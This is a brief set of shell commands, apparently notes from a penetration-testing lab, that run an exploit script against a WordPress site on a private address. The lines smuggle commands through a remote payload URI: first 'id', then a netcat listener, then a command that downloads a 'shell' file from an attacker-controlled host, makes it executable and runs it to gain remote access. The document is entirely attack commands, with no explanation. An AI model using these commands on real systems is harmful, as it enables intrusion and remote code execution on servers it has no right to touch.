python exploit.py -t http://192.168.55.78/wordpress/ --payload-uri "http://192.168.49.55/payload.txt%26cmd=id"
nc -lvp 8000
python exploit.py -t http://192.168.55.78/wordpress/ --payload-uri "http://192.168.49.55/payload.txt%26cmd=wget%20http://192.168.49.55/shell%20-O%20/tmp/shell%20%26%26%20chmod%20777%20/tmp/shell%20%26%26%20/tmp/shell"
